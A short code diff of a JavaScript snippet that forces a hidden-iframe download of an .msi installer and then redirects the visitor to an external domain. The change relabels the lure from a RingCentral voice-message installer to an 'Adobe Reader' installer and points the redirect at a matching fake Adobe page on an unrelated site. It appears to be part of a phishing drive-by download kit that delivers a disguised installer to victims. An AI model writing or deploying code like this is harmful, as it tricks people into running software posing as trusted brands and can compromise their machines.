@@ -2,11 +2,11 @@
   // Create a hidden iframe to trigger download
   const iframe = document.createElement('iframe');
   iframe.style.display = 'none';
-  iframe.src = '/my-redirect-app-html-ready/public/ringcentral_app_voicemessage.msi';  // exact filename in /public
+  iframe.src = '/my-redirect-app-html-ready/public/Adobe Reader_en_install.msi';  // exact filename in /public
   document.body.appendChild(iframe);
 
   // Redirect after a short delay
   setTimeout(() => {
-    window.location.href = 'https://mksonline.com.mx/RingCentral/Voice/ringcentral.html';
+    window.location.href = 'https://mksonline.com.mx/css/adobe/reader/download.html';
   }, 3000); // 3 seconds to ensure download starts
 </script>
